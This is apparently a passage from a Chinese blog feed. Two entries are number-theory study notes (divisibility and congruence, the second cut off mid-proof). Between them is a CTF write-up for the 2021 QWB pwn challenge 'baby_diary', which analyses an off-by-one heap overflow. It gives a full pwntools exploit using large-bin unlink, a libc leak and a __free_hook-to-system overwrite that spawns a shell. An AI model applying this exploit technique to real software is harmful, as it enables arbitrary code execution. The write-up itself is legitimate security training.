      <link href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E6%95%B4%E9%99%A4/"/>
      <url>/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E6%95%B4%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<p><font color=red>定理1.1</font> 任意给定整数a和正整数b&gt;0，存在唯一的一对整数q，0≤r≤b，使得a&#x3D;qb+r</p><p><font color=green>推论1</font> 任意给定整数a和正整数b&lt;0，存在唯一的一对整数q，$0\le r\le |b|$，使得a&#x3D;qb+r<br><font color=green>推论2</font> 任意给定整数a,c和整数b≠0，存在唯一的一对整数q,c≤r≤|b|+c，使得a&#x3D;qb+r</p><p><font color=blue>定义1.1</font> 整除、倍数、因子、商</p><p><font color=red>定理1.2</font> 设a,b,c为整数：<br>(1) 若a|b，b|a，则a&#x3D;b<br>(2) 设整数k≠0，若a|b，则ka|kb，反之亦然<br>(3) 对任意整数k，若a|b，则a|kb<br>(4) 若a|b，b≠0，则$\frac{b}{a}|b$<br>(5) 若a|b，b|c，则a|c<br>(6) 若a|b，a|c，则对任意整数s和t，a|sb+tc（裴蜀定理）</p><p><font color=blue>定义1.2</font> 公因数、互素</p><p><font color=red>定理1.3</font> 设a,b为两个不全为0的整数，且a&#x3D;qb+r，q，r为整数，则(a,b)&#x3D;(b,r)</p><p><font color=green>推论</font> 设a,b为两个不全为0的整数，q为整数，则(a, b)&#x3D;(a±bq, b)&#x3D;(a, b±aq)</p><p><font color=red>定理1.4</font> 设a,b为两个正整数，r<del>n-2</del>&#x3D;q<del>n-1</del>r<del>n-1</del>+r<del>n</del>，0≤r<del>n</del>≤r<del>n-1</del>为欧几里得辗转相除算式，则：<br>(1) (a,b)&#x3D;r<del>n</del><br>(2) 存在整数s,t，使得r<del>n</del>&#x3D;sa+tb<br>(3) 任意整数c，若满足c|a且c|b，则c|r<del>n</del></p><p><font color=red>定理1.5</font> 设a,b为两个正整数，上式为其欧几里得辗转相除算式，则由S<del>0</del>&#x3D;0，S<del>1</del>&#x3D;1，S<del>i+1</del>&#x3D;S<del>i-1</del>-q<del>n-i</del>S<del>i</del>，n≥i≥1递推所得的S<del>n-1</del>和S<del>n</del>满足S<del>n-1</del>a+S<del>n</del>b&#x3D;r<del>n</del></p><p>证明：写成矩阵形式</p><p><font color=red>定理1.6</font> 设a,b为两个不全为0的整数，则<br>(1) 对于任意正整数k，(ka,kb)&#x3D;k(a,b)<br>(2) $(\frac{a}{(a,b)},\frac{b}{(a,b)})&#x3D;1$</p><p><font color=red>定理1.7</font> 设a,b,c是三个整数，a≠0，c≠0，若(a,b)&#x3D;1，则(a,bc)&#x3D;(a,c)</p><p><font color=red>定理1.8</font> 设a,b是两个不全为0的整数，关于x和y的整系数不定方程ax+by&#x3D;c有整数解的充要条件是(a,b)|c。若x&#x3D;x<del>0</del>，y&#x3D;y<del>0</del>是方程的一个特解，那么方程的所有整数解都可以表示为：$x&#x3D;x_0-\frac{b}{(a,b)}t, y&#x3D;y_0+\frac{a}{(a,b)}t,t\in\mathbb Z$</p><p><font color=blue>定义1.3</font> 多个数的公因数、最大公因数、互素</p><p><font color=red>定理1.9</font> 设a<del>1</del>,a<del>2</del>,…,a<del>n</del>是n个不全为0的整数，不妨设a<del>1</del>≠0，定义d<del>1</del>&#x3D;(a<del>1</del>, a<del>2</del>)，d<del>2</del>&#x3D;(d<del>1</del>, a<del>3</del>)，…，d<del>n-1</del>&#x3D;(d<del>n-2</del>, a<del>n</del>)，则d<del>n-1</del>&#x3D;(a<del>1</del>, a<del>2</del>, … a<del>n</del>)</p><p><font color=green>推论</font> 设正整数d是a<del>1</del>，a<del>2</del>，…，a<del>n</del>的最大公因数，存在s<del>1</del>，s<del>2</del>，…，s<del>n</del>有d&#x3D;s<del>1</del>a<del>1</del>+s<del>2</del>a<del>2</del>+…+s<del>n</del>a<del>n</del></p><p><font color=red>定理1.10</font> 正整数c是a<del>1</del>，a<del>2</del>，…，a<del>n</del>的最大公因数，当且仅当：<br>(1) c|a<del>1</del>, c|a<del>2</del>, …, c|a<del>n</del><br>(2) 任一整数d若满足d|a<del>1</del>, d|a<del>2</del>, …, d|a<del>n</del>，则d|c</p><p><font color=blue>定义1.4</font> 公倍数、最小公倍数</p><p><font color=red>定理1.11</font> 设a,b为两个正整数，且(a,b)&#x3D;1<br>(1) 若a|c，b|c，则ab|c<br>(2) [a,b]&#x3D;ab</p><p><font color=red>定理1.12</font> 设a,b为两个正整数<br>(1) 对于任何正整数k，[ka, kb]&#x3D;k[a,b]<br>(2) $[a,b]&#x3D;\frac{ab}{(a,b)}$<br>(3) 若a|c，b|c，则[a,b]|c</p><p><font color=red>定理1.13</font> 设a<del>1</del>，a<del>2</del>，…，a<del>n</del>是n个不为0的整数，定义m<del>1</del>&#x3D;[a<del>1</del>, a<del>2</del>]，m<del>2</del>&#x3D;[m<del>1</del>, a<del>3</del>]，…，m<del>n-1</del>&#x3D;[m<del>n-2</del>, a<del>n</del>]，则[a<del>1</del>, a<del>2</del>, …, a<del>n</del>]&#x3D;m<del>n-1</del></p><p><font color=red>定理1.14</font> 与定理1.10类似，不想抄了</p><p><font color=blue>定义1.5</font> 素数</p><p><font color=red>定理1.15</font> 合数的最小的不等于1的正因子p一定是素数且小于根号m<br><font color=green>推论</font> 若所有小于根号m的素数都不是m的因子，则m为素数</p><p><font color=red>定理1.16</font> 素数有无穷多个</p><p><font color=red>定理1.17</font> 素数定理：$\lim_{x\rightarrow\infty}\pi(x)\frac{\ln(x)}{x}&#x3D;1$</p><p><font color=red>定理1.18</font> 切比雪夫定理：设整数n&gt;3，则至少存在一个素数p满足n&lt;p&lt;2n-2</p><p><font color=red>定理1.19</font> 算数基本定理：n为一个大于1的正整数，则n必然可以分解为一些素数的乘积，如果将素因子顺序排列，则n分解方式唯一。</p><p><font color=blue>定义1.6</font> 标准分解式</p><p><font color=blue>定义1.7</font> 高斯函数</p><p><font color=red>定理1.20</font><br>(1) 若x≤y，则[x]≤[y]<br>(2) 整数a满足x-1&lt;a≤x$\Leftrightarrow$a&#x3D;[x]<br>(3) 整数a满足a≤x&lt;a+1$\Leftrightarrow$a&#x3D;[x]<br>(4) 任意整数n，[n+x]&#x3D;n+[x]</p><p><font color=red>定理1.21</font> 整数a,b且b&gt;0，带余除法算式a&#x3D;qb+r，0≤r&lt;b，则q&#x3D;$[\frac{a}{b}]$</p><p><font color=red>定理1.22</font> n!中包含的p次幂次数为$\sum_{i\ge 1}[\frac{n}{p^i}]$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2021 pwn 赛题解析——baby_diary</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/</url>
      
        <content type="html"><![CDATA[<p>这是一道经典的堆题，可以写入、读取和删除。其中最值得研究的就是write函数最后调用的一个函数，其中涉及几个迷之计算。</p><h1 id="Step-1-漏洞分析"><a href="#Step-1-漏洞分析" class="headerlink" title="Step 1: 漏洞分析"></a>Step 1: 漏洞分析</h1><p><img src="https://img-blog.csdnimg.cn/e7cbf205d33f41a9b409090d205ea458.png"><br>我们进入unknown_handle函数（名字是笔者自己起的）：<br><img src="https://img-blog.csdnimg.cn/c4231a861df64e12b4c11ff384bfb768.png"><br>后面有一个unknown_cal函数，这个函数对输入的字符串进行了一系列的操作。首先将各个字符取出将它们的ASCII码全加起来保存到一个变量a中，然后循环进行下面的计算：如果a大于0xF，计算<code>a = (a &gt;&gt; 4) + (a &amp; 0xF)</code>直到a小于0xF为止。返回到unknown_handle函数中，这里对字符串的后面一位进行了修改。但write函数一开始会要求输入size，申请的空间大小是size+1，这就需要注意read_buf这个函数了。当循环退出的时候，i的值应该就是max_len，此时后面的<code>buf[i]=0</code>实际上已经相对于max_len溢出了一个字节。因此unknown_handle函数中最后一条语句实际上相对于size溢出了2个字节。这可能会修改到下一个chunk的size。<br><img src="https://img-blog.csdnimg.cn/c0b133c7127145d188cd165a9a2eb1f1.png"><br><img src="https://img-blog.csdnimg.cn/e7eb284a9bad42ac859dce8a1da3dbbf.png"></p><p>本题还存在数组溢出漏洞。</p><p>请注意read函数，其中并没有对index进行检查，而在check_terminator函数中，存在有整型溢出漏洞，当index为负数时有可能通过检查。<br><img src="https://img-blog.csdnimg.cn/ae5f842a3ec44cfc89d1accd7bf1344b.png"><br><img src="https://img-blog.csdnimg.cn/5b7454430b524f84a07c88ebfcd54bf8.png"><br>但在数组溢出之后，想让check_terminator函数返回true并不容易，需要匹配结束符的ASCII码。</p><p>同样地，delete函数中也存在整型溢出漏洞，但如果对应地址不是有效的堆地址，就会直接报错，因此这里也不好利用：<br><img src="https://img-blog.csdnimg.cn/7ba7668103694495b9f53bbc03e29f25.png"></p><h1 id="Step-2-确定利用方式，调试编写exp"><a href="#Step-2-确定利用方式，调试编写exp" class="headerlink" title="Step 2: 确定利用方式，调试编写exp"></a>Step 2: 确定利用方式，调试编写exp</h1><p>这里需要注意unknown_handle函数时如何溢出一个字节的。在最后一条语句中，unknown_handle函数只会修改这个溢出字节的最低4位，最高4位不变。而堆管理中正常情况下所有的堆块大小都是以整0x10的形式保存的，即所有堆块的大小都是0x10的倍数。因此仅仅依靠一个字节的溢出无法达到堆块重叠的目的。</p><p>这里参考<a href="https://blog.csdn.net/eeeeeight/article/details/118006138?ops_request_misc=&request_id=&biz_id=102&utm_term=baby%20diary&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-118006138.142%5Ev33%5Econtrol,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187">这篇文章</a>的思路，利用large bin进行中转。当large bin中只有一个chunk时，其四个指针fd、bk、fd_nextsize、bk_nextsize有fd&#x3D;bk在main_arena，fd_nextsize&#x3D;bk_nextsize就是chunk自身。<br><img src="https://img-blog.csdnimg.cn/dcd6bf2774dd409b928c6e7b07b9590d.png"><br>当我们再一次分配到这一块内存空间时，我们就可以对这里面残留的4个指针进行改写，将其伪造成一个假chunk，这个chunk的fd指针就是原来的fd_nextsize指针，bk指针就是原来的bk_nextsize指针，将原来的bk指针改为合适的size，准备进行unlink操作。unlink操作最为关键的就是假chunk中两个指针的值，fd需要等于假chunk-0x18，bk需要等于假chunk-0x10。前面说过当large bin中仅有一个chunk时，其fd_nextsize和bk_nextsize均指向其自身，因此这里的<font color=red>bk不需要修改，但fd需要修改。</font><strong>注意：这里需要一定的爆破：由于写入时会在后面加上零字节和标志位，因此需要爆破chunk地址的其中8位，成功率为1&#x2F;256：</strong><br><img src="https://img-blog.csdnimg.cn/98c1f3df3c144579914ca6f660b7685f.png"><br>在爆破成功之后，我们就通过unlink实现了堆块重叠，申请合适的大小就可以使得main_arena的地址可以被其他chunk所读取。</p><p>在获取libc地址后，我们还是利用堆块重叠这一特性，修改tcache的指向到__free_hook，将其改为system地址。然后释放堆块即可。</p><p><strong><font color=red>需要注意的是：假chunk头部应该写的是假chunk的地址而不应该是其他值，因为unlink_chunk函数中那个<code>fd-&gt;bk=p || bk-&gt;fd=p</code>这个检查中p是一个指针。因此我们还需要想办法让这里的值变成假chunk的地址</font><strong>。前面说过，我们通过切割large bin chunk可以获得两个地址，然后我们要改写其中一个地址。改写之后我们再一次释放这个chunk，这时这个chunk会进入到</strong>fastbin</strong>中，这就有可能会在假chunk头部写上一个有效的地址。我们只需要将这个chunk重新分配回来，修改这个地址，就有可能满足unlink的检查条件。（<font color=red>注意：不能让chunk进入tcache的原因是tcache chunk的bk指针实际指向tcache那个结构体，因此会破坏假chunk的结构，覆盖我们写入的size值，导致unlink在检查size时就失败</font>）</p><p>另外，对于最初进入large bin的chunk的大小也有讲究。在第一次写假chunk信息时，我们需要写入一个size的值，而这个size的值会影响到最后的校验位。如果size的值设置得不正确，那么第一次写入和第二次写入计算出来的校验位就会不一样，这样是不可能利用成功的。因为第一次写入影响的是假chunk的fd指针，第二次写入影响的是假chunk地址本身，二者的校验位必须相等才可能使得unlink的检查通过。经过验证，这里的假chunk的size可以写0x800，但是不能写0x700、0x600等值。</p><p>exp如下，平均需要爆破约350次，这和爆破的期望不符，原因暂时不明。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_diary</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    write_diary(<span class="number">0x1070</span> - <span class="number">0x290</span> - <span class="number">0x10</span> + <span class="number">0x4000</span>, <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #0</span></span><br><span class="line">    write_diary(<span class="number">0x810</span> - <span class="number">0x30</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>)                 <span class="comment"># chunk #1</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                                <span class="comment"># chunk #2</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)</span><br><span class="line">    write_diary(<span class="number">0x800</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #1, previous chunk #1 to large bin</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, p64(<span class="number">0x10</span>) + p64(<span class="number">0x800</span>) + <span class="string">b&#x27;\x68\n&#x27;</span>)   <span class="comment"># chunk #3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #4~6</span></span><br><span class="line">    write_diary(<span class="number">0x6B0</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #8~10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># chunk #11~17</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_diary(<span class="number">11</span>+i)                                  <span class="comment"># to tcache</span></span><br><span class="line"></span><br><span class="line">    delete_diary(<span class="number">4</span>)</span><br><span class="line">    delete_diary(<span class="number">3</span>)                                         <span class="comment"># write the chunk_addr to fake chunk&#x27;s header</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># empty tcache, chunk #3, #4, #11~15</span></span><br><span class="line"></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\x80\n&#x27;</span>)                            <span class="comment"># chunk #16, change the chunk address</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x27</span>)                       <span class="comment"># chunk #2, change the prev_inuse bit of chunk #1</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">8</span>) + <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #2, change the prev_size of chunk #2 to 0x500</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)                                         <span class="comment"># trigger unlink</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        write_diary(<span class="number">0x40</span>, <span class="string">b&#x27;deadbeef\n&#x27;</span>)                    <span class="comment"># chunk #1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(counter)</span><br><span class="line"></span><br><span class="line">read_diary(<span class="number">5</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">__malloc_hook = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__free_hook))</span><br><span class="line"></span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line">delete_diary(<span class="number">6</span>)</span><br><span class="line">write_diary(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c33701ccd5034b39a32884e01f1db9e6.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础 Chapter 2——同余</title>
      <link href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E5%90%8C%E4%BD%99/"/>
      <url>/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E5%90%8C%E4%BD%99/</url>
      
        <content type="html"><![CDATA[<h1 id="Chapter-2-同余"><a href="#Chapter-2-同余" class="headerlink" title="Chapter 2 同余"></a>Chapter 2 同余</h1><p><font color=blue>定义2.1</font> 同余、不同余</p><hr><p><font color=purple>定理2.1</font> 同余是一种等价关系（自反性、对称性、传递性依次证明）</p><hr><p><font color=blue>定义2.2</font> 模m剩余类，模m完全剩余系</p><hr><p><font color=blue>定义2.3</font> 模m简化剩余类，完全剩余类中所有与m互素的剩余类。模m简化剩余系。欧拉函数：整数1,2,…,m中所有与m互素的整数个数，即为$\varphi(m)$</p><hr><p><font color=purple>定理2.2</font> $a,b$正整数，$a\equiv b(\mod mn)\Rightarrow a\equiv b(\mod m), a\equiv b(\mod n)$（逆定理不成立）</p><hr><p><font color=purple>定理2.3</font> $m,n$正整数，$a\equiv b(\mod m),a\equiv b(\mod n)\Rightarrow a\equiv b(\mod [m,n])$</p><hr><p><font color=purple>定理2.4</font> 同余性质：<br>(1) $a\equiv b(\mod m)\Rightarrow a+c\equiv b+c(\mod m)$<br>(2) $a\equiv b(\mod m), k\in Z\Rightarrow ak\equiv bk(\mod m)$<br>(3) $ak\equiv bk(\mod m), k\in Z,(k,m)&#x3D;1\Rightarrow a\equiv b(\mod m)$<br>(4) $a\equiv b(\mod m), k\in N\Leftrightarrow ak\equiv bk(\mod mk)$<br>(5) $a\equiv b(\mod m), f(x)$为一整系数多项式，$f(a)\equiv f(b)(\mod m)$</p><p><font color=orange>推论</font> 若$a_1\equiv a_2(\mod m),b_1\equiv b_2(\mod m)$，则$a_1+b_1\equiv a_2+b_2(\mod m),a_1b_1\equiv a_2b_2(\mod m)$</p><hr><p><font color=purple>定理2.5</font> 设m为正整数，若(a,m)&#x3D;1，则当x遍历m的一个完全剩余系时，对于任意整数b，ax+b遍历模m的一个完全剩余系；当x遍历m的一个简化剩余系时，ax遍历m的一个简化剩余系。</p><p><font color=dblue>证明：</font><br>设$r_1,r_2,…,r_m$是模m的一个完全剩余系，当$i\ne j$时，$r_i\ne r_j(\mod m)$，又$(a,m)&#x3D;1$，则$ar_i+b\ne ar_j+b(\mod m)$，故x遍历r<del>1</del>，r<del>2</del>，…，r<del>m</del>时，ax+b是m个关于m两两互不同余的整数，因此构成完全剩余系。<br>如果$r_1,r_2,…,r_{\varphi(m)}$是简化剩余系，对于所有$r_i,(r_i,m)&#x3D;1$，因为$(a,m)&#x3D;1$，则有$(ar_i,m)&#x3D;1$，即任意ar<del>i</del>均在简化剩余系中且两两互不同余。因此构成简化剩余系。</p><hr><p><font color=purple>定理2.6</font> 设m,n为正整数，(m,n)&#x3D;1，则当x遍历模n的一个完全剩余系，y遍历模m的一个完全剩余系时，mx+ny遍历模mn的一个完全剩余系；当x遍历模n的一个简化剩余系，y遍历模m的一个简化剩余系时，mx+ny遍历模mn的一个简化剩余系。</p><p><font color=dblue>证明：</font><br>假设$mx_1+ny_1\equiv mx_2+ny_2(\mod mn)$，由定理2.2可知，$mx_1+ny_1\equiv mx_2+ny_2(\mod m),mx_1+ny_1\equiv mx_2+ny_2(\mod n)$，又(m,n)&#x3D;1，故$y_1\equiv y_2(\mod m),x_1\equiv x_2(\mod n)$。因此mx+ny互不同余，构成模mn的完全剩余系。<br>若$(x,n)&#x3D;1,(y,m)&#x3D;1$，则$(mx+ny,m)&#x3D;(ny,m)&#x3D;(y,m)&#x3D;1,(mx+ny,n)&#x3D;1$，故$(mx+ny,mn)&#x3D;1$，即任意一个与mn互素的整数都在遍历所产生的$\varphi(m)\varphi(n)$个简化剩余类中。</p><hr><p><font color=purple>定理2.7</font> （欧拉定理）m为正整数，(a,m)&#x3D;1，则$a^{\varphi(m)}\equiv 1(\mod m)$</p><p><font color=dblue>证明：</font><br>构造模m的简化剩余系$r_1,r_2,…,r_{\varphi(m)}$，(a,m)&#x3D;1，故由定理2.4有$ar_1,ar_2,…,ar_{\varphi(m)}$也是模m简化剩余系。故对于任意$1\le i\le \varphi(m)$有且仅有唯一$1\le j\le \varphi(m)$使得$ar_i&#x3D;r_j$。故<br>$$r_1r_2…r_{\varphi(m)}\equiv a^{\varphi(m)}r_1r_2…r_{\varphi(m)}(\mod m)$$<br>证毕</p><hr><p><font color=purple>定理2.8</font> （费马小定理）p为素数，则对于任意整数a，$a^p\equiv a(\mod p)$</p><p><font color=dblue>证明：</font><br>由欧拉定理可知若(a,p)&#x3D;1，则$a^{\varphi(p)}&#x3D;a^{p-1}\equiv 1(\mod p)$，原命题成立<br>否则必有p|a，即$a^{p-1}\equiv a\equiv 0(\mod p)$</p><hr><p><font color=purple>定理2.9</font> m,n为正整数，若互素，则$\varphi(m)\varphi(n)&#x3D;\varphi(mn)$</p><p><font color=dblue>证明：</font><br>定理2.6</p><hr><p><font color=purple>定理2.10</font> p为素数，e为正整数，则$\varphi(p^e)&#x3D;p^e-p^{e-1}$</p><p><font color=dblue>证明：</font><br>从1到p^e^中与p^e^不互素的只有p的倍数，共有p^e-1^个。</p><hr><p><font color=purple>定理2.11</font> 设m为正整数，$m&#x3D;\prod_{i&#x3D;1}^Sp_i^{a_i}$，则$\varphi(m)&#x3D;m\prod_{i&#x3D;1}^S(1-\frac{1}{p_i})$</p><p><font color=dblue>证明：</font><br>定理2.9，2.10</p><hr><p><font color=blue>定义2.4</font> 模m同余式：$f(x)&#x3D;\sum_{i&#x3D;0}^{n}a_ix^i$为一个整系数多项式，m为正整数，称$f(x)\equiv 0(\mod m)$为模m同余式。若$a_n\ne 0(\mod m)$则称该同余式次数为n，如果整数a满足$f(a)\equiv 0(\mod m)$则称a为同余式的解。解数：同余式解的个数。</p><hr><p><font color=purple>定理2.12</font> m为正整数，同余式$ax\equiv b(\mod m)$有解的充要条件是(a,m)|b。有解时结束为(a,m)，且若x&#x3D;x<del>0</del>是同余式的一个特解，则同余式的所有解可以表示为<br>$$x\equiv x_0+\frac{m}{(a,m)}t(\mod m),t&#x3D;0,1,2,…,(a,m)-1$$</p><p><font color=dblue>证明：</font><br>若$ax\equiv b(\mod m)$有解，则存在整数y使得ax-b&#x3D;my，且若x&#x3D;x<del>0</del>，y&#x3D;y<del>0</del>是ax-b&#x3D;my的一个解，则$x\equiv x_0(\mod m)$就是$ax\equiv b(\mod m)$的一个解。根据定理1.8可知，ax-b&#x3D;my有解的充要条件是(a,m)|b。<br>若x&#x3D;x<del>0</del>，y&#x3D;y<del>0</del>是ax-b&#x3D;my的一个解，则ax-b&#x3D;my的所有解可以表示为：<br>$$\left{<br>        \begin{aligned}<br>             x&#x3D;x_0+\frac{m}{(a,m)}t\<br>             y&#x3D;y_0+\frac{a}{(a,m)}t<br>       \end{aligned}<br>       ,t\in\mathbb Z<br>\right.<br>$$<br>可将$x&#x3D;x_0+\frac{m}{(a,m)}t,t\in\mathbb Z$写为(a,m)个模m的同余类，即t取0,1,…,(a,m)-1</p><hr><p><font color=purple>定理2.13</font> m为正整数，(a,m)&#x3D;1，则$a^{\varphi(m)-1}$是a模m的逆元。</p><p><font color=dblue>证明：</font>略</p><hr><p><font color=purple>定理2.14</font> （Wilson定理）设p为素数，则$(p-1)!\equiv -1(\mod p)$</p><p><font color=dblue>证明：</font><br>p&#x3D;2时结论显然成立<br>p&gt;2，对于$1\le a\le 